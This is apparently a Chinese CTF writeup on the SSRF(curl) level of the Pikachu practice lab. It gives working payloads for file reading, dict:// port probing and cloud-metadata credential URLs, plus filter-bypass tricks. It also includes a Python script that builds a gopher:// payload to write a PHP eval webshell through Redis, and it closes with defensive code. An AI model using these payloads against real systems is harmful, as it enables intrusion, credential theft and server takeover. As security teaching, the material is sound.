---
layout: post
title: Pikachu - SSRF(curl) Writeup（端口探测与 gopher）
platform: pikachu
date: 2026-10-29 20:54:00 +0800
categories: CTF
---

Pikachu - SSRF(curl) Writeup（端口探测与 gopher）

一、题目信息

- 平台：Pikachu 漏洞练习平台（本地搭建）
- 模块：SSRF → SSRF(curl)
- 地址：`http://localhost/pikachu/vul/ssrf/ssrf_curl.php`
- 题型：Web
- 考点：**curl 的 SSRF**、`dict://` 端口探测、`gopher://`

**环境信息**：

```text
phpStudy 8.1.1.3（D:\phpstudy_pro）
Apache 2.4.39 + MySQL 5.7.26 + PHP 7.3.4nts
模块目录：D:\phpstudy_pro\WWW\pikachu\vul\ssrf\
    ssrf_curl.php     ★ 本关页面
    ssrf_info\
        info1.php     内网服务示例（普希金《假如生活欺骗了你》）
        info2.php     内网服务示例（艾青《我爱这土地》）
```

**页面形态**：

```text
累了吧,来读一首诗吧
└───────┬───────┘
   ★ 这是一个链接，本身就是"预置好参数的示例"
```

**★ 页面源码（第 64 行）**：

```html
<a href="ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php">
    累了吧,来读一首诗吧
</a>
```

**★ 所以这一关没有输入框 —— 参数 `url` 直接暴露在链接里。**

**作者提示**：

```html
data-content="先了解一下php中curl相关函数的用法吧"
```

**✅ 实测结果（6 种 payload）**

| # | `url` 参数 | 结果 |
|---|---|---|
| 1 | （点链接，默认值）`http://127.0.0.1/.../info1.php` | ✅ 输出"假如生活欺骗了你"（普希金）|
| 2 | `http://127.0.0.1/.../info2.php` | ✅ 输出"我爱这土地"（艾青）|
| 3 | **`file:///C:/Windows/win.ini`** | **✅ 输出 win.ini 全文** |
| 4 | **`http://127.0.0.1:80/`** | **✅ 输出 pikachu 首页 HTML** |
| 5 | **`dict://127.0.0.1:3306/`** | **✅ 输出 MySQL banner：`5.7.26` + `mysql_native_password`** |
| 6 | `http://127.0.0.1:9999/` | 空（端口关闭）|

二、题目分析

**① 漏洞代码：curl 三行**

```php
<?php
// ssrf_curl.php 第 27-40 行
if(isset($_GET['url']) && $_GET['url'] != null){
    //接收前端URL没问题,但是要做好过滤,如果不做过滤,就会导致SSRF
    $URL = $_GET['url'];                            // ★ 用户完全控制
    $CH = curl_init($URL);                          // ★ 用这个 URL 初始化
    curl_setopt($CH, CURLOPT_HEADER, FALSE);
    curl_setopt($CH, CURLOPT_SSL_VERIFYPEER, FALSE);
    $RES = curl_exec($CH);                          // ★ 执行请求
    curl_close($CH);
//ssrf的问是:前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端。
//除了http/https外,curl还支持一些其他的协议 curl --version 可以查看其支持的协议,telnet
//curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP
    echo $RES;                                      // ★ 结果回显
}
?>
```

**★ 作者的注释已经把"关键点"写出来了**：

```
"前端传进来的url被后台使用curl_exec()进行了请求,然后将请求的结果又返回给了前端"
"curl支持很多协议，有FTP, FTPS, HTTP, HTTPS, GOPHER, TELNET, DICT, FILE以及LDAP"
```

**★ 三个条件（都满足）**：

```
① 参数 url 完全可控
② 后端真的去请求（curl_exec）
③ 结果回显（echo $RES）
★ → 有回显的 SSRF（最好利用的一种）
```

**② 什么是 SSRF**

**★ 定义**：

```
SSRF = Server-Side Request Forgery（服务端请求伪造）
服务器有一个"根据用户给的 URL 去请求"的功能
且没有限制"能请求哪里"
→ 攻击者可以让【服务器】去请求【任意地址】
```

**★ 一个比喻**：

```
你被关在门外（外网），进不去公司（内网）
但前台（有 SSRF 的服务器）能进
你跟前台说"帮我去 3 楼财务室拿份文件"
前台真的去拿了，还念给你听

★ 前台 = 有 SSRF 的服务器
★ 3 楼财务室 = 内网服务
★ "念给你听" = 响应被回显
```

**③ curl 支持的协议（本关的核心武器）**

**★ `curl --version` 能看到**：

```
dict  file  ftp  ftps  gopher  gophers  http  https
imap  imaps  ldap  ldaps  mqtt  pop3  pop3s  rtmp
rtsp  scp  sftp  smb  smbs  smtp  smtps  telnet  tftp
```

**★ 本关实测能用的**：

| 协议 | 用途 | 实测 |
|---|---|---|
| `file://` | 读本地文件 | ✅ |
| `http://` `https://` | 请求内网/外网 | ✅ |
| **`dict://`** | **端口探测（拿 banner）** | ✅ |
| **`gopher://`** | **构造任意 TCP 包** | 未测（需靶机开服务）|

**★ 和 `file_get_contents` 版的差异**：

| 协议 | **curl 版** | file_get_contents 版 |
|---|---|---|
| `file://` | ✅ | ✅ |
| `http://` | ✅ | ✅ |
| **`dict://`** | ✅ | ❌ |
| **`gopher://`** | ✅ | ❌ |
| `php://filter` | ⚠️ | ✅ |
| `data://` | ❌ | ✅ |

**★ 一句话**：

```
curl 版"打"的能力强（gopher/dict）
file_get_contents 版"读"的能力强（php://filter）
★ 所以两关打法不同
```

**④ `dict://` 为什么能"探端口"**

**★ dict 协议是什么**：

```
RFC 2229 定义的"字典查询协议"
客户端连上端口后，发 "DEFINE ..." 之类的命令
服务器返回文本响应
★ 但 curl 只用它"建立 TCP 连接 + 读响应"
```

**★ 为什么能"拿 banner"？**

```
curl 用 dict 协议连上 127.0.0.1:3306（MySQL）
→ MySQL 一连接就会"主动发握手包"（含版本号、认证方式）
→ curl 把收到的原始数据返回
→ 你在页面上看到：5.7.26 / mysql_native_password
★ 这叫 banner grabbing（banner 抓取）
```

**★ 端口探测的三种判断**：

```
① 有 banner          → 端口开放（如 3306 的 MySQL）
② 有 HTTP 响应       → 端口开放（如 80 的 Apache）
③ 空 / 报错 / 超时   → 端口关闭
```

**⑤ 内网请求：那两首诗的意义**

**★ `info1.php` / `info2.php` 就是"两个普通 PHP 页面"**：

```php
// info1.php
$html = <<<A
<br>
<pre>
假如生活欺骗了你

作者：普希金
...
A;
echo $html;
```

**★ 它们的意义**：

```
模拟"内网服务"
    · 正常情况下，外网访问不到
    · 但 SSRF 让"服务器替你去请求"
    → 把内网内容返回给你
★ 这就是"SSRF 能读内网"的直观演示
```

三、解题步骤

**第 1 步：点链接（看正常功能）**

```text
① 打开 http://localhost/pikachu/vul/ssrf/ssrf_curl.php
② 页面只有一行字："累了吧,来读一首诗吧"
③ 点它
④ URL 变成：ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php
⑤ 页面显示：
   假如生活欺骗了你
   作者：普希金
   ...
```

**★ 这一步说明**：

```
① 参数名是 url
② 服务器真的去请求了 127.0.0.1
③ 内容回显给你
★ 接下来就是"把 url 换成别的东西"
```

**第 2 步：⭐ 读系统文件**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=file:///C:/Windows/win.ini
```

**★ 预期**：

```ini
; for 16-bit app support
[fonts]
[extensions]
[mci extensions]
[files]
[Mail]
MAPI=1
```

**★ 这一步证明**：

```
curl 支持 file://
→ 服务器上的任意文件都能读
```

**第 3 步：⭐ 端口探测（本关最有特色）**

**★ 地址栏粘**：

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=dict://127.0.0.1:3306/
```

**★ 页面出现乱码 + 关键信息**：

```
J...5.7.26...mysql_native_password...08S01Got packets out of order
    └──┬──┘ └─────────┬─────────┘
 MySQL 版本         认证插件
```

**★ 再探几个端口**：

```
?url=dict://127.0.0.1:22/       → 可能有 SSH-2.0-OpenSSH 之类
?url=dict://127.0.0.1:80/       → 会返回 HTTP 的 400 响应
?url=dict://127.0.0.1:6379/     → 如果 Redis 开着，可能返回 -ERR
?url=dict://127.0.0.1:9999/     → 空（端口关闭）
```

**★ 实战意义**：

```
不需要"内网扫描器"
只要目标有 SSRF，就能"以它为跳板"扫内网
★ 这是"内网渗透"的第一步
```

**第 4 步：请求内网页面（SSRF 本质）**

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
```

**★ 输出"我爱这土地"（艾青）。**

**第 5 步：请求本站（看响应内容）**

```
http://localhost/pikachu/vul/ssrf/ssrf_curl.php?url=http://127.0.0.1:80/
```

**★ 输出 pikachu 首页的完整 HTML。**

**★ 注意**：

```
页面会"嵌套"（2 个 <html>）
★ 这和目录遍历那关的"页面嵌套"是同一个现象
```

**第 6 步：完整 payload 汇总**

```
// ========== 正常（页面链接里的默认值）==========
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info1.php

// ========== 读本地文件 ==========
file:///C:/Windows/win.ini
file:///C:/Windows/System32/drivers/etc/hosts
file:///etc/passwd                            （Linux）

// ========== SSRF（请求内网）==========
http://127.0.0.1/pikachu/vul/ssrf/ssrf_info/info2.php
http://127.0.0.1:80/
http://192.168.1.1/                          （内网地址）

// ========== 端口探测（dict）==========
dict://127.0.0.1:22/
dict://127.0.0.1:3306/
dict://127.0.0.1:6379/
dict://127.0.0.1:80/

// ========== 打内网应用（gopher）==========
gopher://127.0.0.1:6379/_<URL编码的 Redis 命令>
gopher://127.0.0.1:9000/_<URL编码的 FastCGI 包>
```

四、延伸知识

**① ⭐ gopher 协议：SSRF 的"终极武器"**

**★ 为什么 gopher 最强？**

```
gopher:// 能"发送任意 TCP 数据包"
→ 可以用它"手工构造"任何协议的请求
→ Redis / MySQL / FastCGI / SMTP / Memcached ... 都能打
★ 这是 SSRF 从"读"升级到"打"的关键
```

**★ gopher 的语法**：

```
gopher://<host>:<port>/_<URL编码后的数据>

★ 注意：
   · 端口后必须有 /_
   · 数据要 URL 编码（\r\n → %0d%0a）
```

**★ 经典利用：打 Redis 写 webshell**

**★ Redis 未授权时的攻击链**：

```
① CONFIG SET dir /var/www/html/        设置工作目录
② CONFIG SET dbfilename shell.php      设置文件名
③ SET x "<?php @eval($_POST[1]);?>"    写入内容
④ SAVE                                 保存（落盘）
→ /var/www/html/shell.php 生成
```

**★ 用 Python 构造 gopher payload**：

```python
import urllib.parse

payload = (
    "CONFIG SET dir /var/www/html/\r\n"
    "CONFIG SET dbfilename shell.php\r\n"
    'SET x "<?php @eval($_POST[1]);?>"\r\n'
    "SAVE\r\n"
)

enc = urllib.parse.quote(payload, safe='')
url = "gopher://127.0.0.1:6379/_" + enc
print(url)
```

**★ 输出形如**：

```
gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20%2Fvar%2Fwww%2Fhtml%2F%0D%0ACONFIG...
```

**★ 用它打目标**：

```
?url=gopher://127.0.0.1:6379/_CONFIG%20SET%20dir%20...
→ 目标服务器替你执行 Redis 命令
→ webshell 落地 → getshell
```

**★ 为什么这招厉害？**

```
Redis 默认"无密码"（很多内网实例）
且"只监听内网"（外网连不上）
→ 正常情况下打不到
→ 但 SSRF 能"从内网打内网" → 绕过限制
```

**★ 其他 gopher 利用**：

```
· 打 FastCGI（PHP-FPM）→ 执行任意 PHP 代码
· 打 MySQL（无密码 root）→ 执行 SQL
· 打 Memcached → 投毒
· 打 SMTP → 发钓鱼邮件
★ 工具：Gopherus（自动生成 payload）
```

**② SSRF 的五种利用方向**

| 方向 | payload | 效果 |
|---|---|---|
| **读本地文件** | `file:///path` | 读任意文件 |
| **内网端口扫描** | `dict://host:port/` | 判断端口开放 + 拿 banner |
| **攻击内网应用** | `gopher://host:port/_...` | 打 Redis/FastCGI/MySQL |
| **云元数据** | `http://169.254.169.254/...` | 拿临时凭证 |
| **探测内网拓扑** | `http://192.168.1.1~254/` | 画内网地图 |

**★ 云元数据最值钱**：

```
http://169.254.169.254/latest/meta-data/iam/security-credentials/
    （AWS）
http://metadata.google.internal/computeMetadata/v1/  （GCP）
http://100.100.100.200/latest/meta-data/            （阿里云）

★ 能拿到：实例 ID / 内网 IP / 临时 AK/SK / user-data（可能含密码）
★ 拿到 AK/SK → 接管整个云账号
★ Capital One 事件（1 亿用户数据）就是这么打的
```

**③ SSRF 的八种绕过技巧**

**★ 很多防护会"过滤内网地址"，以下是绕过思路。**

**绕过 1：IP 的"变形写法"**

```
127.0.0.1        → 正常
127.1            → 简写
0x7f.0.0.1       → 十六进制
0177.0.0.1       → 八进制
2130706433       → 十进制整数
127.0.0.1.       → 结尾加点
```

**★ 原理**：

```
"正则过滤 127.0.0.1"认不出这些变形
★ 但操作系统的解析器都认
```

**绕过 2：`@` 混淆**

```
http://expected.com@evil.com/
★ 有些正则匹配"包含 expected.com" → 放过
★ 实际主机是 evil.com
```

**绕过 3：302 跳转**

```
① 传你控制的地址（不在黑名单）
② 你的服务器返回：
   HTTP/1.1 302 Found
   Location: http://127.0.0.1/
③ 目标"跟着跳转" → 请求了内网
★ 很多 SSRF 只校验"第一次请求的地址"
```

**绕过 4：DNS 重绑定**

```
① 你控制一个域名 evil.com
② 第一次解析 → 返回"公网 IP"（通过校验）
③ 第二次解析 → 返回 127.0.0.1（攻击时）
★ 利用"校验"和"实际请求"的时间差
```

**绕过 5：短链接**

```
http://t.cn/xxx  →  302 到内网
```

**绕过 6：IPv6**

```
http://[::1]/
http://[0:0:0:0:0:ffff:127.0.0.1]/
```

**绕过 7：URL 编码**

```
http://%31%32%37.0.0.1
```

**绕过 8：域名指向内网**

```
把 evil.com 的 A 记录设成 127.0.0.1
→ 校验时"不是内网 IP 字面量" → 放过
→ 实际请求解析到 127.0.0.1
```

**④ 盲 SSRF（没有回显）怎么打**

**★ 如果 `echo` 被去掉**：

**方法 1：看响应时间**

```
?url=http://127.0.0.1:80/       → 快（端口开放）
?url=http://127.0.0.1:9999/     → 慢（连接超时）
★ 用"耗时"判断端口是否开放
```

**方法 2：看报错**

```
?url=http://127.0.0.1:3306/     → 报"不是 HTTP 响应"
?url=http://127.0.0.1:9999/     → 报"连接超时"
★ 不同的报错 = 不同的服务
```

**方法 3：带外（OOB）**

```
?url=http://your-server.com/probe
→ 如果你的服务器收到请求 → "能外连"
→ 确认 SSRF 存在
```

**方法 4：DNS 日志**

```
?url=http://random.你的域名.com
→ 看 DNS 服务器日志里有没有这次解析
★ 连"TCP 连接"都不需要，纯 DNS 就能确认
```

**⑤ 防御（五层）**

**❌ 本关的反面教材**：

```php
$URL = $_GET['url'];
$CH = curl_init($URL);
echo curl_exec($CH);
```

**✅ 第 1 层：不用"用户输入的 URL"（根本）**

```php
// ❌ 危险
$url = $_GET['url'];

// ✅ 映射表
$map = ['1' => 'http://api.example.com/a', '2' => 'http://api.example.com/b'];
$url = $map[$_GET['id']] ?? die('非法');
```

**✅ 第 2 层：白名单（协议 + 域名 + 端口）**

```php
$parsed = parse_url($_GET['url']);

// 协议白名单
if (!in_array(strtolower($parsed['scheme'] ?? ''), ['http', 'https'], true)) {
    die('非法协议');
}
// 域名白名单（精确匹配）
if (!in_array(strtolower($parsed['host'] ?? ''), ['api.example.com'], true)) {
    die('非法域名');
}
// 端口白名单
if (!in_array($parsed['port'] ?? 80, [80, 443], true)) {
    die('非法端口');
}
```

**✅ 第 3 层：限制 curl 的能力（关键三行）**

```php
$CH = curl_init($url);
curl_setopt($CH, CURLOPT_FOLLOWLOCATION, false);                        // ★ 防 302 绕过
curl_setopt($CH, CURLOPT_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);  // ★ 禁 gopher/dict/file
curl_setopt($CH, CURLOPT_REDIR_PROTOCOLS, CURLPROTO_HTTP | CURLPROTO_HTTPS);
curl_setopt($CH, CURLOPT_TIMEOUT, 5);                                   // ★ 防"时间盲注"
curl_setopt($CH, CURLOPT_MAXREDIRS, 0);
```

**★ 这三行挡住的东西**：

```
CURLOPT_PROTOCOLS → gopher / dict / file / ftp 全禁
CURLOPT_FOLLOWLOCATION → 302 绕过失效
CURLOPT_TIMEOUT → "用时间做盲注"失效
```

**✅ 第 4 层：禁止内网 IP（辅助）**

```php
$ip = gethostbyname($parsed['host']);
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('禁止访问内网地址');
}
```

**★ 为什么只是"辅助"**：

```
· 能被"IP 变形写法"绕过
· 能被"DNS 重绑定"绕过
· 能被"302 跳转"绕过
★ 必须和白名单配合
```

**✅ 第 5 层：网络层隔离（架构）**

```
· Web 服务器放 DMZ，不能随便访问内网
· 内网服务"只允许必要来源 IP"
· 云环境关闭 IMDSv1，强制 IMDSv2（需要 token）
  ★ 这样即使 SSRF 也拿不到元数据
```

**★ 这层是"最后一道防线"**：

```
代码层白名单可能被绕
但"网络隔离"是硬的
★ 即使 SSRF 存在，也"打不到内网"
```

**⑥ 本关与 SSRF(file_get_content) 的对照**

| | **SSRF(curl)** | SSRF(file_get_content) |
|---|---|---|
| 函数 | **`curl_exec`** | `file_get_contents` |
| 参数 | **`url`** | `file` |
| 读文件 | ✅ | ✅ |
| 请求内网 | ✅ | ✅ |
| **端口探测** | ✅ **`dict://`** | ❌ |
| **打 Redis** | ✅ **`gopher://`** | ❌ |
| 读 PHP 源码 | ⚠️ | ✅ `php://filter` |
| 内联数据 | ❌ | ✅ `data://` |

**★ 一句话**：

```
curl 版"打"的能力强
file_get_contents 版"读"的能力强
★ 两个都要会
```

五、总结

- **本题核心：`curl_init($_GET['url'])` + `echo curl_exec($CH)` → 服务器替攻击者请求任意地址（SSRF），且结果回显。**

- **三行漏洞代码**：

```php
$URL = $_GET['url'];
$CH = curl_init($URL);
echo curl_exec($CH);        // ★ 用户控制 URL，结果回显
```

- **⭐ 八个必记要点**：

```text
① SSRF = "服务器替你去请求"
   三个条件：参数可控 + 真去请求 + 结果回显

② curl 支持的协议最多
   file / http / dict / gopher / ftp / ldap / smb ...
   ★ dict 和 gopher 是"攻击利器"

③ dict:// 能拿 banner → 端口探测
   dict://127.0.0.1:3306/ → 5.7.26 + mysql_native_password
   ★ 看"有没有响应"判断端口开放

④ gopher:// 是"终极武器"
   能发任意 TCP 包 → 打 Redis / FastCGI / MySQL
   ★ 语法：gopher://host:port/_<URL编码数据>
   ★ 这是 SSRF 从"读"升级到"打"的关键

⑤ 云环境元数据最值钱
   http://169.254.169.254/latest/meta-data/iam/security-credentials/
   ★ 拿到 AK/SK → 接管云账号

⑥ 八种绕过：IP 变形 / @ / 302 / DNS 重绑定 / 短链 / IPv6 / 编码 / 域名指向内网
   ★ 只过滤 "127.0.0.1" 必被绕

⑦ 盲 SSRF 靠"时间/报错/带外/DNS"判断
   echo 被去掉 → 难度大增

⑧ 防御：不用用户 URL（根本）> 白名单 > curl 限协议 > 网络隔离
   ★ 关键三行：PROTOCOLS / FOLLOWLOCATION / TIMEOUT
```

- **实测数据**：

```text
默认链接（info1.php）                → 假如生活欺骗了你（普希金）
http://127.0.0.1/.../info2.php       → 我爱这土地（艾青）
file:///C:/Windows/win.ini           → [fonts] [extensions] [mci extensions] [files] [Mail] MAPI=1
http://127.0.0.1:80/                 → pikachu 首页 HTML
dict://127.0.0.1:3306/               → 5.7.26 + mysql_native_password + 08S01Got packets out of order
http://127.0.0.1:9999/               → 空（端口关闭）
```

- **进度**：

```text
platform: pikachu   42 篇（本地 108 篇）

├── 暴力破解            4/4    ✅
├── CSRF                3/3    ✅
├── XSS                10/10   ✅
├── SQL 注入           10/10   ✅
├── RCE                 2/2    ✅
├── File Inclusion      2/2    ✅
├── Unsafe Filedownload 1/1    ✅
├── Unsafe Fileupload   3/7    （暂停，剩 4 关）
├── Over Permission     2/2    ✅
├── 目录遍历            1/1    ✅
├── 敏感信息泄露        1/1    ✅
├── PHP 反序列化        1/1    ✅
├── XXE                 1/1    ✅
├── URL 重定向          1/1    ✅
└── SSRF                1/2    ← curl 完成，fgc 见下一篇
```

**手工复现要点**：

```text
· 打开 ssrf_curl.php → 点"累了吧,来读一首诗吧" → 看到普希金的诗
· 改 url=file:///C:/Windows/win.ini → 看到 win.ini
· 改 url=dict://127.0.0.1:3306/ → 看到 MySQL 的 5.7.26
· 改 url=http://127.0.0.1:80/ → 看到 pikachu 首页（页面嵌套）
· 改 url=http://127.0.0.1:9999/ → 空（端口关闭）
```

**一句话记忆**：

```
┌────────────────────────────────────────────────────────────┐
│  curl 版 SSRF = "读文件 + 探端口 + 打内网"                     │
│                                                            │
│  ?url=file:///C:/Windows/win.ini   → 读文件                  │
│  ?url=http://127.0.0.1/内网页面     → SSRF                   │
│  ?url=dict://127.0.0.1:3306/       → 端口探测（拿 banner）    │
│  ?url=gopher://127.0.0.1:6379/_... → 打 Redis（终极武器）     │
│                                                            │
│  ★ gopher 能发任意 TCP 包 → Redis 写 webshell                 │
│  ★ 云环境打 169.254.169.254 → 拿 AK/SK                        │
│  ★ 只过滤 127.0.0.1 必被绕（IP 变形/302/DNS 重绑定）            │
│                                                            │
│  防御关键三行：PROTOCOLS / FOLLOWLOCATION / TIMEOUT            │
└────────────────────────────────────────────────────────────┘
```
